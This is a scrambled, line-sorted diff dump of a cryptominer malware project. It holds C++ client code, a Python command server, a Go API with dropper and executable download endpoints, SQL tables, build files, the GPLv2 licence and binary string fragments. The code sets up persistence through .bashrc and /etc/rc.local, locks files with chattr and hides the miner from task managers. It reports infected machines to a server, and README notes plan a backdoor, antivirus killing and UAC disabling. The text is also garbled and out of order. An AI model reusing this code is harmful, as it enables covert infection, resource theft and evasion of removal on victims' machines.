@@ -1,0 +1,1879 @@
+    
+        
+            
+                            NO WARRANTY
+                            Preamble
+                        body=encoded_body)
+                     END OF TERMS AND CONDITIONS
+                    GNU GENERAL PUBLIC LICENSE
+                Tasks::lock_task_manager = false
+                Tasks::lock_task_manager = true
+            FILE 
+            How to Apply These Terms to Your New Programs
+            char 
+            char line[256]
+            command 
+            const char 
+            copy_executable_to_folder()
+            error()
+            fclose(g)
+            if (!(fpipe = (FILE
+            if(pid == 0){
+            out.push_back(char((val>>valb)
+            output = (char 
+            pclose(fpipe)
+            post(argv[2])
+            valb-=6
+            valb-=8
+            }
+            }else{
+        /
+        FILE 
+        char 
+        const char 
+        content_length = int(self.headers['Content-Length']) 
+        copy_executable_to_folder()
+        else:
+        error()
+        f.write(str(List[0]) 
+        f.write(str(List[1]))
+        fclose(f)
+        for(std::string s : programs){
+        get_mining_pool_info()
+        if (T[c] == -1) break
+        if (valb>=0) {
+        if(f == NULL){
+        if(len(argv) > 2):
+        ip = self.address_string()
+        offline()
+        pool_info = json.dumps(self.send_pool_info())
+        post_data = base64.decodestring(post_data)
+        post_data = self.rfile.read(content_length) 
+        req = urllib.request.urlopen(url).read()
+        return
+        return false
+        return true
+        returned_data = str(r.data)
+        run()
+        run(port=int(argv[1]))
+        self._set_headers()
+        self.end_headers()
+        self.logg()
+        self.send_response(200)
+        self.wfile.write(pool_info)
+        set_persistence_bits()
+        sleep(2)
+        std::string comando2
+        std::string comando3
+        system(command2)
+        system(command3)
+        time = self.date_time_string() 
+        val = (val<<6) 
+        val = (val<<8) 
+        valb 
+        while (valb>=0) {
+        }
+     Check_task_manager()
+    (at your option) any later version.
+    ./dummy-web-server.py [<port>]
+    /
+    // // desalocate memory
+    // Tasks::check_task_manager()
+    // const char 
+    // create directory
+    // free(pool)
+    // free(pool->id)
+    // free(pool->pool)
+    // if(Tasks::lock_task_manager){
+    // remove old virus file.
+    // std::thread multithreading(Tasks::check_task_manager)
+    // system(command)
+    // }
+    // }else{
+    1 and 2 above on a medium customarily used for software interchange
+    </modules>
+    <modules>
+    <one line to give the program's name and a brief idea of what it does.>
+    CONNECTION LIMIT = -1
+    Copyright (C) <year>  <name of author>
+    ENCODING = 'UTF8'
+    FILE 
+    GNU General Public License for more details.
+    Gnomovision comes with ABSOLUTELY NO WARRANTY
+    License.  (Exception: if the Program itself is interactive but
+    List = json.loads(str(req))
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    OWNER = postgres
+    OWNER to postgres
+    PRIMARY KEY (id)
+    This program is free software
+    WITH
+    You should have received a copy of the GNU General Public License along
+    a warranty) and that users may redistribute the program under
+    a) Accompany it with the complete corresponding machine-readable
+    a) You must cause the modified files to carry prominent notices
+    allowed only for noncommercial distribution and only if you
+    announcement including an appropriate copyright notice and a
+    bool lock_task_manager = false
+    but WITHOUT ANY WARRANTY
+    c) Accompany it with the information you received as to the offer
+    c) If the modified program normally reads commands interactively
+    char 
+    chdir(miner_path)
+    const char 
+    curl -I http://localhost
+    curl http://localhost
+    customarily used for software interchange
+    def _set_headers(self):
+    def do_GET(self):
+    def do_POST(self):
+    def logg(self):
+    def send_pool_info(self):
+    distributed under the terms of Sections 1 and 2 above on a medium
+    drop_python_script()
+    elif(argv[1] == 'post'):
+    else:
+    encoded_body = msg 
+    except urllib.error.URLError:
+    except:
+    exit(-1)
+    exit(-2)
+    exit(0)
+    fclose(f)
+    for (char c : in) {
+    for (int i=0
+    home = (char
+    http = urllib3.PoolManager()
+    httpd.serve_forever()
+    if len(argv) == 2:
+    if(argv[1] == 'get_pool'):
+    if(create_cryptomining_folder()){
+    if(getuid()!= 0){
+    if(is_root()){
+    if(len(argv) < 2):
+    if(ret != 0){
+    if(ret == 0){
+    if(root){
+    install_persistence()
+    int ret = system(command)
+    int ret = system(get_pool)
+    it under the terms of the GNU General Public License as published by
+    new_miner()
+    parties under the terms of this License.
+    pool->id = (char 
+    pool->pool =(char 
+    pool_info 
+    print 'Starting web server...'
+    print(req)
+    pw = (uid == NO_UID 
+    received the program in object code or executable form with such
+    req = str(req)
+    return false
+    return home
+    return id
+    return out
+    return pool
+    return pw->pw_name
+    return true
+    static std::string base64_decode(const std::string 
+    static std::string base64_encode(const std::string 
+    static void exit_error(const std::string
+    static void log_error(const std::string
+    stating that you changed the files and the date of any change.
+    std::cerr << s << std::endl
+    std::string caminho
+    std::string commands
+    std::string encoded = Base64::base64_encode(send)
+    std::string out
+    std::string send = std::string(name) 
+    std::string x
+    struct passwd 
+    struct stat st = {0}
+    sudo apt-get install libcurl4-openssl-dev
+    system(a)
+    system(command)
+    the Free Software Foundation
+    the Program is not required to print an announcement.)
+    to distribute corresponding source code.  (This alternative is
+    try:
+    uid = getuid()
+    uid_t NO_UID = -1
+    uid_t uid
+    under certain conditions
+    void check_task_manager()
+    void threading_task_manager()
+    while (out.size()%4) out.push_back('=')
+    while(true){
+    whole or in part contains or is derived from the Program or any
+    with this program
+    }
+    }else{
+    }else{    
+  0. This License applies to any program or other work which contains
+  1. You may copy and distribute verbatim copies of the Program's
+  10. If you wish to incorporate parts of the Program into other free
+  12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
+  2. You may modify your copy or copies of the Program or any portion
+  6. Each time you redistribute the Program (or any work based on the
+  8. If the distribution and/or use of the Program is restricted in
+  9. The Free Software Foundation may publish revised and/or new versions
+  </component>
+  The licenses for most software are designed to take away your
+  python3 communication.py get_pool
+  python3 communication.py post
+ !IsNullOrEmpty(value) {
+ !defined(_WIN32)
+ %JY 
+ %JZ 
+ %Y 
+ -1 invalid sintaxe
+ -2 offline
+ ./cliente
+ // thread creation
+ 500)
+ Client side
+ Compiled Dynamic libraries
+ Compiled Object files
+ Compiled Static libraries
+ Compiled binaries
+ Continue virus inside his directory 
+ Contributing
+ Create folder and copy malware to it 
+ CryptoMining  (WORK IN PROGRESS)
+ Cryptography to secure client-server communication 
+ Datasource local storage ignored files
+ Default ignored files
+ Dropper
+ Editor-based HTTP Client requests
+ Errors
+ Everyone is permitted to copy and distribute verbatim copies
+ Executables
+ FROM X
+ Fortran module files
+ Gets the data itself
+ Gets the size of data
+ Ideias
+ Invalid usage
+ MAX_TERMINAL_OUTPUT)
+ Multiple Miners 
+ NULL: getpwuid(uid))
+ Offline server or computer
+ PYTHON WEB SERVER
+ Persist the malware 
+ Persistence
+ Precompiled Headers
+ Prerequisites
+ Process hiding and obfuscation / Persistence 
+ SOURCE CODE OF CRYPTOMINING
+ Server
+ Server side
+ T[c]
+ alter the names:
+ and each file should have at least
+ and run in the machine
+ and that you know you can do these things.
+ argv[]){
+ bashrc_path = (caminho = std::string(get_home_enviroment()) 
+ cgminer 
+ client.cpp tasks.cpp communication.cpp error.cpp -o cliente 
+ comando = command.c_str()
+ create hidden/secure directory to store settings and info about the mining process
+ curl
+ defined(__APPLE__) 
+ defined(__MACH__)
+ defined(__MACH__) // Apple OSX and iOS (Darwin)
+ defined(__SVR4)
+ for details type 
+ get_home_enviroment()
+ get_home_enviroment(){
+ get_machine_id()
+ get_machine_id(){
+ get_pool_info()
+ get_pool_info(){
+ get_username()
+ get_username(){
+ home
+ i<64
+ id = (char 
+ id = get_machine_id()
+ it is up to the author/donor to decide if he or she is willing
+ keep intact all the
+ less third-parties libraries possible 
+ name = get_username()
+ pool = get_pool_info()
+ pool name 
+ s){
+ send msg to server
+ strlen(pw->pw_dir)))
+ they are outside its scope.  The act of
+ they could even be
+ this section has the sole purpose of protecting the
+ type 
+ we sometimes
+ without even the implied warranty of
+ you can redistribute it and/or modify
+ {pool} = 
+!/usr/bin/env python
+"                        headers={'Content-Type': 'text/html'},"
+"                       Version 2, June 1991"
+"                Error::log_error(""Couldnt read terminal output"")"
+"                strcat(output, line)"
+"            memset(output, 0, MAX_TERMINAL_OUTPUT)"
+"            out.push_back(""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+"            pid_t pid = strtoul(output, NULL, 10)"
+"            std::string command = ""pidof """
+"            while (fgets( line, 256, fpipe)){"
+"        Error::exit_error(""[-] Couldn't Get pool info, server possible be offline or no internet connection."")"
+"        Error::log_error(""Setting chattr in all files"")"
+"        Error::log_error(""["
+"        Error::log_error(""[-] Chattr error!"")"
+"        mkdir(miner_path, 0700)"
+"        msg = ""Connected By [{}] At [{}]"".format(ip, time)"
+"        print("""
+"        print(""Erro no POST"")"
+"        print(""POST error"")"
+"        r = http.request('POST', url,"
+"        return self.pool_key, self.pool_name"
+"        self.pool_key = ""teste"""
+"        self.pool_name = ""teste2"""
+"        self.send_header('Content-type', 'text/html')"
+"        self.wfile.write(""eae men"")"
+"        std::string("""
+"        std::vector<std::string> programs = {""top"", ""htop"", ""atop"", ""python3 glances"", ""pstree""}"
+"        system(""sudo chattr "
+"      <module fileurl=""file://$PROJECT_DIR$/.idea/cryptomining.iml"" filepath=""$PROJECT_DIR$/.idea/cryptomining.iml"" />"
+"    ""targetOs"" text NOT NULL,"
+"    //     std::cout << ""false"" << std::endl"
+"    //     std::cout << ""true"" << std::endl"
+"    // std::cout << ""Starting thread to mine ..."" << std::endl"
+"    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA."
+"    <content url=""file://$MODULE_DIR$"" />"
+"    <mapping directory=""$PROJECT_DIR$"" vcs=""Git"" />"
+"    <orderEntry type=""inheritedJdk"" />"
+"    <orderEntry type=""sourceFolder"" forTests=""false"" />"
+"    Error::log_error(""[-] Persistence failed"")"
+"    Gnomovision version 69, Copyright (C) year name of author"
+"    This is free software, and you are welcome to redistribute it"
+"    This program is distributed in the hope that it will be useful,"
+"    an offer, in accord with Subsection b above.)"
+"    b) Accompany it with a written offer, valid for at least three"
+"    b) You must cause any work that you distribute or publish, that in"
+"    cost of physically performing source distribution, a complete"
+"    curl -d ""foo=bar"
+"    does not normally print such an announcement, your work based on"
+"    fprintf(f, ""%s"", script)"
+"    fscanf(f, ""%s"", id)"
+"    fscanf(f, ""%s"", pool->id)"
+"    fscanf(f, ""%s"", pool->pool)"
+"    httpd = server_class(server_address, handler_class)"
+"    id serial NOT NULL,"
+"    if (stat(miner_path, "
+"    if (valb>-6) out.push_back(""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+"    int val=0, valb=-6"
+"    int val=0, valb=-8"
+"    interactive use in the most ordinary way, to print or display an"
+"    machine-readable copy of the corresponding source code, to be"
+"    name text NOT NULL,"
+"    notice that there is no warranty (or else, saying that you provide"
+"    part thereof, to be licensed as a whole at no charge to all third"
+"    payload text NOT NULL,"
+"    req = req.replace(""b'"", '').replace(""'"", """")"
+"    server_address = ('', port)"
+"    source code, which must be distributed under the terms of Sections"
+"    std::cout << ""Dropping python script on machine"" << std::endl"
+"    std::cout << ""Getting pool information ..."" << std::endl"
+"    std::cout << ""Mining POOL: {id} = ""<< pool->id << "" {pool} = "" << pool->pool << std::endl"
+"    std::cout << ""Running persistence ... "" << std::endl"
+"    std::cout << ""Sending to server the miner ID ..."" << std::endl"
+"    std::vector<int> T(256,-1)"
+"    strcat(home, ""/"")"
+"    strcpy(home, pw->pw_dir)"
+"    these conditions, and telling the user how to view a copy of this"
+"    version text NOT NULL,"
+"    when run, you must cause it, when started running for such"
+"    with open(arq, 'w') as f:"
+"    years, to give any third party, for a charge no more than your"
+"   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION"
+"  11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY"
+"  3. You may copy and distribute the Program (or a work based on it,"
+"  4. You may not copy, modify, sublicense, or distribute the Program"
+"  5. You are not required to accept this License, since you have not"
+"  7. If, as a consequence of a court judgment or allegation of patent"
+"  <component name=""Go"" enabled=""true"" />"
+"  <component name=""NewModuleRootManager"">"
+"  <component name=""ProjectModuleManager"">"
+"  <component name=""VcsDirectoryMappings"">"
+"  <signature of Ty Coon>, 1 April 1989"
+"  Also, for each author's protection and ours, we want to make certain"
+"  Finally, any free program is threatened constantly by software"
+"  For example, if you distribute copies of such a program, whether"
+"  If you develop a new program, and you want it to be of the greatest"
+"  The precise terms and conditions for copying, distribution and"
+"  To do so, attach the following notices to the program.  It is safest"
+"  To protect your rights, we need to make restrictions that forbid"
+"  Ty Coon, President of Vice"
+"  We protect your rights with two steps: (1) copyright the software, and"
+"  When we speak of free software, we are referring to freedom, not"
+"  Yoyodyne, Inc., hereby disclaims all copyright interest in the program"
+" ""UNKNOWN"" : PLATFORM_NAME)"
+" 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA"
+" Copyright (C) 1989, 1991 Free Software Foundation, Inc.,"
+" If file doesnt exist, create file "
+" a = (x = std::string(""python3 communication.py post "") "
+" command = (commands = std::string(""sudo chattr "
+" command = (x = std::string(""."") "
+" command = (x = std::string(""cp "") "
+" command = (x = std::string(""rm "") "
+" command2 = (comando2 = std::string(""echo "
+" command3 = (comando3 = std::string(""echo "
+" either version 2 of the License, or"
+" f = fopen(""/etc/machine-id"", ""r"")"
+" get_pool = ""python3 communication.py get_pool"""
+" if not, write to the Free Software Foundation, Inc.,"
+" of this license document, but changing it is not allowed."
+" or,"
+" pool, "
+" rather, the intent is to"
+" rc_local = ""/etc/rc.local"""
+" server from scratch, will accept new miners. get info from miners, and will have direct access to the victim machine from a backdoor."
+""" >> "
+""" >> "") "
+""""") "
+""")).c_str()"
+"""database/sql"""
+"""encoding/base64"""
+"""fmt"""
+"""github.com/gin-gonic/gin"""
+"""io/ioutil"""
+"""log"""
+"""main/src/api/controllers/Connect"""
+"""main/src/api/controllers/GetDropper"""
+"""main/src/api/controllers/GetExecutable"""
+"""main/src/api/controllers/IsAlive"""
+"""main/src/api/middlewares"""
+"""main/src/api/shared"""
+"""main/src/api/shared/io"""
+"""main/src/api/variables"""
+"""main/src/application/useCases/GetDropper"""
+"""main/src/infrastructure/database"""
+"""net/http"""
+"""os"""
+"""strconv"""
+"""strings"""
+"""time"""
+"%""Z "
+"(2) offer you this license which gives you legal permission to copy,"
+") T[""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+")popen(comando,""r""))){"
+"- Download the executable -> dropper will hit this endpoint to download the executable binary -> specific for each OS (linux, windows, macOs ...)"
+"/""[((val<<8)>>(valb"
+"/""[(val>>valb)"
+"/""[i]] = i"
+"// c.AbortWithStatusJSON(http.StatusBadRequest, ""err"")"
+"<module type=""WEB_MODULE"" version=""4"">"
+"<project version=""4"">"
+"= std::string("" "") "
+"= std::string("""
+"= std::string("".bashrc"")).c_str()"
+"ALTER TABLE IF EXISTS public.""Dropper"""
+"Activities other than copying, distribution and modification are not"
+"BytesAsB64: binaryAsB64,"
+"BytesAsB64: shared.GetPayloadFromDisk(configVariables.ExecutablePath),"
+"CREATE DATABASE ""Cryptominer"""
+"CREATE TABLE public.""Dropper"""
+"Config: configVariables,"
+"ConnectController: Connect.ConnectController{},"
+"Database:          database,"
+"Database:       GetDatabaseConfig(),"
+"Database: database,"
+"DatabaseName: dbName,"
+"DropperPath:    ""/home/user/dropper.exe"","
+"Every new miner will have an directory, containing info about the mining time, logs, Keys used to secure communication(cryptography), etc."
+"ExecutablePath: ""/home/user/executable.exe"","
+"Execute(input any) (string, error)"
+"FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN"
+"GetDropper2 ""main/src/application/useCases/GetDropper"""
+"GetDropperBinary() (string, error)"
+"H5{,"
+"HEHHHHEHHUHEH5,"
+"HH1HHEHHUHEH5,"
+"HKH_HH_H0H5V"""
+"Hardcoded encrypted :server, port and mining pool info "
+"HnUHH H}HuHUHEH,"
+"Hostname:     host,"
+"However, parties who have received copies, or rights, from you under"
+"I've created a trello to keep the progress, what have been done, and what else is there to do. "
+"INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING"
+"If the program is interactive, make it output a short notice like this"
+"If the task manager is opened, the child process is killed. When closed, child will be respawned."
+"In addition, mere aggregation of another work not based on the Program"
+"IsAliveController: IsAlive.IsAliveController{},"
+"License and any other pertinent obligations, then as a consequence you"
+"OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF"
+"One process is responsible for server communication and checking task manager, while the child process will only mine."
+"PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING,"
+"PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE"
+"PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED"
+"Password:     password,"
+"Payload: payloadAsB64,"
+"Port:         portNum,"
+"Program), the recipient automatically receives a license from the"
+"Program), you indicate your acceptance of this License to do so, and"
+"REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES,"
+"Software Foundation, write to the Free Software Foundation"
+"This program isn't ready, I'm developing it everyday. "
+"Thus, it is not the intent of this section to claim rights or contest"
+"Username:     username,"
+"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR"
+"You may charge a fee for the physical act of transferring a copy, and"
+"[-] Couldn't Get pool info, server possible be offline or no internet connection."
+"] Chattr setted!"")"
+"] Cryptomining folder created!"")"
+"above, provided that you also meet all of these conditions:"
+"access to copy from a designated place, then offering equivalent"
+"addr := fmt.Sprintf(""0.0.0.0:%v"", 3001)"
+"all its terms and conditions for copying, distributing or modifying"
+"all those who receive copies directly or indirectly through you, then"
+"any particular circumstance, the balance of the section is intended to"
+"app, err := BuildApp()"
+"associated interface definition files, plus the scripts used to"
+"be similar in spirit to the present version, but may differ in detail to"
+"bin=baz"" http://localhost"
+"binaryAsB64, err := database.GetDropperBinary()"
+"c.IndentedJSON(http.StatusOK, """")"
+"c.IndentedJSON(http.StatusOK, response)"
+"certain countries either by patents or by copyrighted interfaces, the"
+"code means all the source code for all modules it contains, plus any"
+"conditions are imposed on you (whether by court order, agreement or"
+"content, err := ioutil.ReadFile(path)"
+"control compilation and installation of the executable.  However, as a"
+"countries not thus excluded.  In such case, this License incorporates"
+"database, err := sql.Open(""postgres"", psqlconn)"
+"db.Config.Database.Hostname,"
+"db.Config.Database.Password,"
+"db.Config.Database.Port,"
+"db.Config.Database.Username,"
+"dbName := GetEnvVariables(""DB_NAME"", """")"
+"def run(server_class=HTTPServer, handler_class=S, port=80):"
+"define PLATFORM_NAME ""aix"" // IBM AIX"
+"define PLATFORM_NAME ""android"" // Android (implies Linux, so it must come first)"
+"define PLATFORM_NAME ""bsd"" // FreeBSD, NetBSD, OpenBSD, DragonFly BSD"
+"define PLATFORM_NAME ""hp-ux"" // HP-UX"
+"define PLATFORM_NAME ""ios"" // Apple iOS"
+"define PLATFORM_NAME ""linux"" // Debian, Ubuntu, Gentoo, Fedora, openSUSE, RedHat, Centos and other"
+"define PLATFORM_NAME ""osx"" // Apple OSX"
+"define PLATFORM_NAME ""solaris"" // Oracle Solaris, Open Indiana"
+"define PLATFORM_NAME ""windows"" // Windows (Cygwin POSIX under Microsoft Window)"
+"define PLATFORM_NAME ""windows"" // Windows"
+"define executable_name ""cryptominer"""
+"define executable_path ""/tmp/cryptomining/cryptominer"""
+"define miner_path ""/tmp/cryptomining/"""
+"distribute copies of the software, or if you modify it."
+"distribution of the source code, even though third parties are not"
+"echo """
+"entire whole, and thus to each and every part regardless of who wrote it."
+"f = fopen(""communication.py"", ""w"
+"f = fopen(""mining_pool_info_file.txt"", ""r"")"
+"f = fopen(executable_path, ""rb"")"
+"f = fopen(rc_local, ""r"")"
+"form) with the major components (compiler, kernel, and so on) of the"
+"freedom to share and change it.  By contrast, the GNU General Public"
+"from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer"
+"from sys import argv, exit"
+"func (db Database) GetDropperBinary() (string, error) {"
+"func (useCase GetDropperUseCase) Execute(input any) (string, error) {"
+"func BuildApp() (App, error) {"
+"func GetEnvVariables(key, defaultValue string) string {"
+"g = fopen(rc_local, ""w"")"
+"gratis or for a fee, you must give the recipients all the rights that"
+"host := GetEnvVariables(""DB_HOSTNAME"", """")"
+"ia "") "
+"ia file"")"
+"identifiable sections of that work are not derived from the Program,"
+"if __name__ == ""__main__"":"
+"if you want it, that you can change the software or use pieces of it"
+"import ""github.com/gin-gonic/gin"""
+"import ""main/src/api"""
+"import urllib.request, json, time, urllib3"
+"include ""base64.h"""
+"include ""communication.h"""
+"include ""error.h"""
+"include ""system.h"""
+"include ""tasks.h"""
+"include ""utils.h"""
+"infringement or for any other reason (not limited to patent issues),"
+"input ""main/src/api/controllers/GetDropper/io"""
+"input := ""asdfasd"""
+"int main(int argc, char "
+"integrity of the free software distribution system, which is"
+"language.  (Hereinafter, translation is included without limitation in"
+"later version"", you have the option of following the terms and conditions"
+"library.  If this is what you want to do, use the GNU Lesser General"
+"log.Printf(""error logging into DB: %v"", err)"
+"log.Printf(""error occurred: %v"", err)"
+"log.Printf(""error querying: %v"", err)"
+"log.Printf(""error trying to open db connection: %v"", err)"
+"log.Printf(""incorrect input format: %v"", err)"
+"log.Printf(""unable to read file: %v"", err)"
+"making modifications to it.  For an executable work, complete source"
+"may not distribute the Program at all.  For example, if a patent"
+"nMSG [{}]"".format(post_data))"
+"newDb, err := db.createConnection()"
+"of it, thus forming a work based on the Program, and copy and"
+"on the Program, the distribution of the whole must be on the terms of"
+"operating system on which the executable runs, unless that component"
+"original licensor to copy, distribute or modify the Program subject to"
+"otherwise to copy, modify, sublicense or distribute the Program is"
+"otherwise) that contradict the conditions of this License, they do not"
+"panic(""error building the app"")"
+"panic(fmt.Sprintf(""invalid database port config: %s"", port))"
+"parts of the General Public License.  Of course, the commands you use may"
+"password := GetEnvVariables(""DB_PASSWORD"", """")"
+"payloadAsB64, err := controller.UseCase.Execute(payload)"
+"port := GetEnvVariables(""DB_PORT"", """")"
+"portNum, err := strconv.Atoi(port)"
+"possible use to the public, the best way to achieve this is to make it"
+"program proprietary.  To prevent this, we have made it clear that any"
+"program will individually obtain patent licenses, in effect making the"
+"programs whose distribution conditions are different, write to the author"
+"prohibited by law if you do not accept this License.  Therefore, by"
+"proprietary programs.  If your program is a subroutine library, you may"
+"psqlconn := fmt.Sprintf(""host=%s port=%d user=%s password=%s dbname=%s sslmode=disable"","
+"refers to any such program or work, and a ""work based on the Program"""
+"return """", err"
+"return App{}, err"
+"return database, nil"
+"return dropperBinary, nil"
+"return nil, err"
+"return useCase.Payload.BytesAsB64, nil"
+"router.GET(""/dropper/download"", app.GetDropperController.Get)"
+"router.GET(""/executable/download"", app.GetExecutableController.Get)"
+"router.POST(""/executable/IsAlive"", app.IsAliveController.Check)"
+"router.POST(""/executable/connect"", app.ConnectController.Connect)"
+"rows, err := newDb.Query(q)"
+"rows, err := newDb.Query(q, input)"
+"running the Program is not restricted, and the output from the Program"
+"school, if any, to sign a ""copyright disclaimer"" for the program, if"
+"script = R""(import urllib.request, json, time, urllib3"
+"signed it.  However, nothing else grants you permission to modify or"
+"software.  If the software is modified by someone else and passed on, we"
+"source code as you receive it, in any medium, provided that you"
+"special exception, the source code distributed need not include"
+"specifies a version number of this License which applies to it and ""any"
+"sql.DB, error) {"
+"sql.DB, error)"
+"that is to say, a work containing the Program or a portion of it,"
+"the ""copyright"" line and a pointer to where the full notice is found."
+"the term ""modification"".)  Each licensee is addressed as ""you""."
+"themselves, then this License, and its terms, do not apply to those"
+"this License, whose permissions for other licensees extend to the"
+"this License, you may choose any version ever published by the Free Software"
+"this service if you wish), that you receive source code or can get it"
+"those countries, so that distribution is permitted only in or among"
+"under the terms of this General Public License.  The ""Program"", below,"
+"username := GetEnvVariables(""DB_USERNAME"", """")"
+"value, found := os.LookupEnv(key)"
+"void, and will automatically terminate your rights under this License."
+"want its recipients to know that what they have is not the original, so"
+"xml version=""1.0"" encoding=""UTF-8"""
+"you have.  You must make sure that they, too, receive or can get the"
+"your programs, too."
+"}, nil"
+$(CC) -c base64.cpp -o base64.o
+$(CC) -c client.cpp -o client.o $(VERSION)
+$(CC) -c error.cpp -o error.o $(VERSION)
+$(CC) -c tasks.cpp -o tasks.o $(VERSION) $(THREAD)
+$(CC) -c utils.cpp -o utils.o $(VERSION)
+$(CC) client.o utils.o error.o tasks.o base64.o -o $(OUTPUT) $(VERSION) $(THREAD)
+$(RM) 
+%2Z 
+%:Z 
+%BZ 
+%jY 
+%jZ 
+%zW 
+%zY 
+%zZ 
+) malloc(sizeof(char) 
+) malloc(sizeof(pool_info))
+)malloc((sizeof(char) 
+)malloc(32)
+)malloc(sizeof(char) 
+- Adding executable in startup
+- Adding executable in task scheduler
+- Compression (dropper/executable)
+- Download the dropper -> URL to download the dropper binary
+- Kill av
+- Run as admin
+- Self-destruct - the dropper will kill itself after finishing its work
+- disable UAC
+- executable IsAlive -> executable hits this endpoint so the server knows who's active mining - hit every X mins
+- executable connect -> when executable start running hit this endpoint first - send info about the infected machine and get pool info and so on ...
+.app
+.bashrc
+.bss
+.comment
+.data
+.dll
+.dylib
+.dynamic
+.dynstr
+.dynsym
+.eh_frame
+.eh_frame_hdr
+.exe
+.fini
+.fini_array
+.gcc_except_table
+.gch
+.gnu.hash
+.gnu.version
+.gnu.version_r
+.got.plt
+.init
+.init_array
+.interp
+.jcr
+.lai
+.lib
+.mod
+.note.ABI-tag
+.note.gnu.build-id
+.obj
+.out
+.pch
+.plt.got
+.rela.dyn
+.rela.plt
+.rodata
+.shstrtab
+.slo
+.smod
+.so.6
+.strtab
+.symtab
+.text
+// CHANGE PERMISSION BITS TO CREATE DIRECTORY 
+// IF NO INTERNET CONNECTION -> HARDCODED MINING INFO -> POOL ID
+// TODO: log if someone is trying to check the api 
+// TODO: refactor this name
+// db.Db.Query()
+// insert any input into database as json
+/dataSources.local.xml
+/dataSources/
+/etc/machine-id
+/etc/rc.local
+/httpRequests/
+/lib64/ld-linux-x86-64.so.2
+/shelf/
+/tmp/cryptomining/
+/tmp/cryptomining/cryptominer
+/workspace.xml
+0%RY 
+0%RZ 
+0%Y 
+0BkIe7MYkRdwZOjgMj2KwnJFUo=
+0HHt
+0x3F])
+0xFF))
+2EHcH
+3Zlu5yQgKGP2/hcQbHb7S9Y=
+6bVFTBQFZX0r7ipe9JQ1QsbMgHwbBziscLw=
+7HHEH
+9EI=
+9GITq07hpfrRu66IVDexMakfv52eLZ2CXBWiKr4=
+</module>
+</project>
+= encoded).c_str()
+= std::string(bashrc_path)).c_str()
+= std::string(executable_name) 
+= std::string(executable_name)).c_str()
+= std::string(executable_path)).c_str()
+= std::string(id)
+= std::string(miner_path) 
+= std::string(rc_local)).c_str()
+= x 
+>HEH
+@%Y 
+@%ZY 
+@%ZZ 
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+ATHHH
+AWAVAAUATL%>
+Abc=
+Also add information on how to contact you by electronic and paper mail.
+Also will be capable of sending files and downloading files from the infected machine. 
+Aqpx/iMHu5Yooh7jEzJk1JZ7Pjtmys2ukPr7EeM=
+BF8dHX5nt/dr0=
+BytesAsB64 string
+C64Yfv1cQ7kz7rIZviUmN
+CC=g
+CXXABI_1.3
+Config variables.Config
+ConnectController       Connect.ConnectController
+Connection between miner and server
+Couldnt read terminal output
+CtDdOsPc=
+DJW3UT/LiOwJeYQe1efqtUx/iVham/4vfdArNI=
+DW.ref.__gxx_personality_v0
+Database                database.IDatabase
+Database       DatabaseConfig
+Database database.IDatabase
+DatabaseName string
+Date time.Time // the date that the dropper is executed
+Download the executable as  
+Dropper is the program that first executes in an infection.
+DropperPath    string
+Dropping python script on machine
+EE@HEHEH
+EHEHEHEH5HEHEHHEHUHEHH
+EHEHEHEHTHEHEHHEHUHEHHI
+EHEHEH}
+EHHEH
+EHMHUHE
+Each version is given a distinguishing version number.  If the Program
+EgEM=
+ExecutablePath string
+Feel free to join the development of this cryptominer with code or ideas.
+Foundation's software and to any other program whose authors commit to
+Foundation.
+GAPziupqXw64V24skbSoqbTEfhy4qGm1nDQc=
+GCC: (Debian 6.3.0-18
+GCC_3.0
+GLIBCXX_3.4
+GLIBCXX_3.4.21
+GLIBC_2.2.5
+General Public License applies to most of the Free Software
+GetDropperController    GetDropper.GetDropperController
+GetDropperController: GetDropper.GetDropperController{
+GetExecutableController GetExecutable.GetExecutableController
+GetExecutableController: GetExecutable.GetExecutableController{
+Getting pool information ...
+Gnomovision' (which makes passes at compilers) written by James Hacker.
+H H-L
+H HHEHHEHHEHHEHHEH
+H HPHHHHEHHUHMHEHHHEHHHH
+H [A
+H$HHEHHHHHHH1HEHEHHEHeHEHHHZHHKH
+H'H/HHH/H
+H'HEH
+H([]UHH
+H)HH
+H/HHEH
+H0H H_H
+H0HHHHEHHUH
+H0Hf
+H5> 
+H5A3 
+H5D 
+H5X 
+H5q(
+H9uH
+H=AT 
+H=W 
+H=X 
+H=bX 
+H=fW 
+H=l2
+H>E}
+H>HEH
+HE HE HE3HaHUHEHHIHHHH8[]UHH}HE]UHH
+HEH(
+HEH.HEH
+HEH5
+HEH5(
+HEH51
+HEH5p2
+HEH9HE
+HEH9UHH H}HuHUHEH(
+HEH>
+HEH@
+HEHE
+HEHEH
+HEHEH58(
+HEHEH@ HH6HEHEHP HEHH
+HEHEHE}
+HEHEHOHHOHMH HHRH
+HEHEHP
+HEHEHUHHz
+HEHEHZHEH>HEHBHEH
+HEHH
+HEHH3
+HEHHEH
+HEHHEHGHEHyHUHEH5!
+HEHHEHHJ@HH5.
+HEHHHEHTHHEH
+HEHHHHEHh[]UHH
+HEHHS
+HEHHUHEH5-
+HEHP
